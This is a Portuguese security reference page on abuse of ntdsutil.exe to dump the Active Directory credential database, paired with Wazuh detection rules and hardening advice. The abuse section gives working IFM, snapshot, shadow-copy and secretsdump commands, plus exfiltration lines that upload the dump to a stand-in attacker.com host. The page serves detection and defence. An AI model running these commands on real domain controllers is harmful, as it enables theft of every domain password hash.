# ntdsutil.exe

**Plataforma:** Windows Server (com Active Directory Domain Services)

**Categorias:** Dump de credenciais, Active Directory, Escalada de impacto

**MITRE ATT&CK:** T1003.003 (OS Credential Dumping — NTDS), T1006 (Direct Volume Access)

**Referência ofensiva:** https://lolbas-project.github.io/lolbas/Binaries/Ntdsutil/

---

## O que é o ntdsutil.exe

O ntdsutil.exe é uma ferramenta de linha de comando para gerenciamento do Active Directory Domain Services (AD DS) e do serviço de replicação de domínio. É usada por administradores de domínio para tarefas como defragmentação do banco de dados NTDS, movimentação dos arquivos do AD, gerenciamento de snapshots e criação de cópias de instalação de mídia (IFM — Install From Media).

O binário está presente em controladores de domínio Windows Server e requer privilégios de Administrador de Domínio ou equivalente para a maioria de suas funções.

---

## Por que atacantes usam o ntdsutil.exe

O ntdsutil é o vetor mais direto para comprometimento total de um domínio Active Directory. A função IFM (Install From Media) foi projetada para criar uma cópia do banco de dados do AD para instalação de novos controladores de domínio sem replicação completa pela rede. Essa cópia inclui o arquivo `ntds.dit` — o banco de dados do Active Directory que contém todos os objetos do domínio, incluindo os hashes de senha de todos os usuários.

Com o `ntds.dit` e o arquivo `SYSTEM` do registro (que contém a chave de criptografia), é possível extrair offline todos os hashes NTLM de todos os usuários do domínio — incluindo o Administrator e todos os usuários com contas — usando ferramentas como `secretsdump.py` do Impacket ou Mimikatz.

Em termos práticos: quem executa o ntdsutil com sucesso em um controlador de domínio tem, em minutos, acesso a todas as senhas do domínio.

---

## Técnicas de abuso

### Criação de cópia IFM (técnica principal)

Esta é a técnica documentada na maioria dos incidentes. Cria uma cópia completa do banco de dados do AD em um diretório local:

```cmd
:: Modo interativo
ntdsutil

:: Dentro do ntdsutil:
activate instance ntds
ifm
create full C:\temp\ADDump
quit
quit

:: Modo não interativo (todos os comandos em uma linha)
ntdsutil "ac i ntds" "ifm" "create full C:\temp\ADDump" q q

:: Alternativa — criar apenas snapshot sem os logs binários (menor, mais rápido)
ntdsutil "ac i ntds" "ifm" "create sysvol full C:\temp\ADDump" q q
```

O resultado é um diretório com a seguinte estrutura:

```
C:\temp\ADDump\
├── Active Directory\
│   └── ntds.dit          <- banco de dados completo do AD
└── registry\
    ├── SECURITY          <- arquivo de segurança
    └── SYSTEM            <- chave de decodificação dos hashes
```

Para extrair os hashes offline (na máquina do atacante):

```bash
# Via Impacket secretsdump
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL

# Resultado: todos os hashes NTLM do domínio
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
# usuario1:1103:aad3b435b51404eeaad3b435b51404ee:7a21990fcd3d759941e45c490f143d5f:::
```

### Criação de snapshot do AD

```cmd
:: Criar snapshot do AD sem criar IFM completo
ntdsutil snapshot "activate instance ntds" create quit quit

:: Listar snapshots existentes
ntdsutil snapshot "list all" quit quit

:: Montar snapshot para acesso
ntdsutil snapshot "mount {GUID-do-snapshot}" quit quit
```

### Transferência e exfiltração da cópia

Após criar a cópia, o atacante precisa exfiltrá-la:

```cmd
:: Comprimir e exfiltrar via PowerShell
Compress-Archive C:\temp\ADDump\ C:\temp\ADDump.zip
(New-Object Net.WebClient).UploadFile('http://attacker.com/collect', 'C:\temp\ADDump.zip')

:: Via robocopy para compartilhamento do atacante
robocopy C:\temp\ADDump \\attacker.com\share\dump /E

:: Via bitsadmin upload
bitsadmin /transfer UploadJob /upload http://attacker.com/collect C:\temp\ADDump\Active Directory\ntds.dit
```

---

## Técnicas de bypass e evasão

### Criação em diretório menos óbvio

```cmd
:: Em vez de C:\temp, usar localização menos monitorada
ntdsutil "ac i ntds" "ifm" "create full C:\Windows\Temp\WindowsUpdate" q q
ntdsutil "ac i ntds" "ifm" "create full C:\ProgramData\Microsoft\update" q q
```

### Volume Shadow Copy como alternativa ao ntdsutil

Quando o ntdsutil está monitorado, o atacante pode copiar o `ntds.dit` diretamente de um shadow copy sem usar o ntdsutil:

```cmd
:: Criar shadow copy
vssadmin create shadow /for=C:

:: Acessar o ntds.dit via shadow copy (sem acionar ntdsutil)
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM
```

Essa alternativa não usa ntdsutil e portanto não seria detectada por regras específicas do ntdsutil — o que reforça a necessidade de monitorar também o `vssadmin` e acesso direto a volume shadow copies.

---

## Detecção

### O que monitorar

**Indicadores de alta relevância — virtualmente sem falso positivo em produção:**

- ntdsutil com argumentos `ifm` e `create full` — criação de cópia do AD
- ntdsutil com argumentos `snapshot` e `create` — criação de snapshot
- Criação do arquivo `ntds.dit` fora de `C:\Windows\NTDS\` (localização padrão do AD)
- Acesso ao arquivo `ntds.dit` por qualquer processo além do `lsass.exe` e do serviço NTDS

**Indicadores correlacionados:**

- ntdsutil + criação subsequente de arquivo comprimido no mesmo diretório
- ntdsutil + transferência de arquivo via bitsadmin, robocopy ou PowerShell nas horas seguintes
- `vssadmin create shadow` seguido de `copy` de `ntds.dit` ou `SYSTEM`

### Regra Wazuh

```xml
<!-- Arquivo: wazuh-rules/windows/0203-lolbas_dump.xml -->

<group name="lolbins,lolbas,windows,dump,active-directory">

  <!-- ntdsutil com IFM create — dump do banco de dados do AD -->
  <rule id="100337" level="15">
    <if_group>sysmon_event1</if_group>
    <field name="win.eventdata.image" type="pcre2">(?i)ntdsutil\.exe$</field>
    <field name="win.eventdata.commandLine" type="pcre2">(?i)ifm.*create|create.*full</field>
    <description>ntdsutil.exe criando IFM — possivel dump completo do banco de dados do Active Directory</description>
    <mitre>
      <id>T1003.003</id>
    </mitre>
  </rule>

  <!-- ntdsutil com snapshot create -->
  <rule id="100338" level="13">
    <if_group>sysmon_event1</if_group>
    <field name="win.eventdata.image" type="pcre2">(?i)ntdsutil\.exe$</field>
    <field name="win.eventdata.commandLine" type="pcre2">(?i)snapshot.*create</field>
    <description>ntdsutil.exe criando snapshot do Active Directory — investigar contexto</description>
    <mitre>
      <id>T1003.003</id>
    </mitre>
  </rule>

  <!-- Qualquer execução de ntdsutil em ambiente de produção -->
  <rule id="100339" level="12">
    <if_group>sysmon_event1</if_group>
    <field name="win.eventdata.image" type="pcre2">(?i)ntdsutil\.exe$</field>
    <description>ntdsutil.exe executado — verificar contexto: qualquer uso fora de janela de manutencao documentada e suspeito</description>
    <mitre>
      <id>T1003.003</id>
    </mitre>
  </rule>

  <!-- Criação de arquivo ntds.dit fora da localização padrão (Sysmon Event ID 11) -->
  <rule id="100340" level="15">
    <if_group>sysmon_event11</if_group>
    <field name="win.eventdata.targetFilename" type="pcre2">(?i)ntds\.dit$</field>
    <field name="win.eventdata.targetFilename" type="pcre2" negate="yes">(?i)\\Windows\\NTDS\\ntds\.dit$</field>
    <description>Arquivo ntds.dit criado fora da localizacao padrao do AD — possivel dump do banco de dados do dominio</description>
    <mitre>
      <id>T1003.003</id>
    </mitre>
  </rule>

</group>
```

### Artefatos forenses

```powershell
# Verificar se há arquivos ntds.dit fora da localização padrão
Get-ChildItem -Path C:\ -Filter ntds.dit -Recurse -ErrorAction SilentlyContinue |
  Where-Object { $_.FullName -notlike "*\Windows\NTDS\*" }

# Verificar eventos de segurança para criação de shadow copies
Get-WinEvent -LogName Security | Where-Object { $_.Id -eq 4670 -and $_.Message -like "*ntds*" }

# Listar shadow copies existentes
vssadmin list shadows
```

### Falsos positivos comuns e como reduzir o ruído

**Instalação de controladores de domínio adicionais:** a função IFM do ntdsutil é genuinamente usada para adicionar novos DCs ao domínio sem replicação completa. Esse processo é documentado, planejado e deve ocorrer apenas durante janelas de manutenção com aprovação registrada. Qualquer uso do ntdsutil com `create full` fora dessas janelas documentadas é suspeito.

**Backups do Active Directory:** algumas soluções de backup do AD invocam o ntdsutil ou criam snapshots como parte do processo de backup. Verifique e documente o comportamento do seu software de backup para criar exceções específicas baseadas no usuário de serviço do backup e no horário de execução.

---

## Proteção e controles defensivos

**Alertas imediatos para qualquer uso do ntdsutil em produção:** em ambientes maduros, o ntdsutil não deve ser executado fora de janelas de manutenção planejadas. Configure alertas de nível crítico com notificação imediata para qualquer execução detectada. O nível 15 das regras acima deve gerar notificação em tempo real para o SOC.

**Segmentação e monitoramento de controladores de domínio:** DCs devem estar em segmento de rede isolado com acesso estritamente controlado. Qualquer conexão de saída de um DC para um servidor não-gerenciado deve gerar alerta.

**Proteger o ntds.dit com SACL:** configure uma System Access Control List no arquivo `C:\Windows\NTDS\ntds.dit` para registrar qualquer tentativa de leitura por processos além dos esperados (`lsass.exe`, serviço NTDS). Isso aparece no log de Segurança do Windows (Event ID 4663).

**Privileged Access Workstations (PAW):** administradores de domínio devem operar apenas de máquinas dedicadas (PAW) que não são usadas para navegação web ou e-mail, reduzindo drasticamente o risco de comprometimento dessas credenciais.

**Tiered Administration Model:** implementar o modelo de administração em camadas da Microsoft, onde credenciais de Tier 0 (AD) nunca tocam máquinas de Tier 1 ou 2, reduz o impacto de comprometimento de credenciais de nível inferior.

---

## Referências

- LOLBAS — ntdsutil.exe: https://lolbas-project.github.io/lolbas/Binaries/Ntdsutil/
- MITRE ATT&CK T1003.003: https://attack.mitre.org/techniques/T1003/003/
- Microsoft — ntdsutil reference: https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731620(v=ws.11)
- Impacket secretsdump: https://github.com/fortra/impacket/blob/master/impacket/examples/secretsdump.py
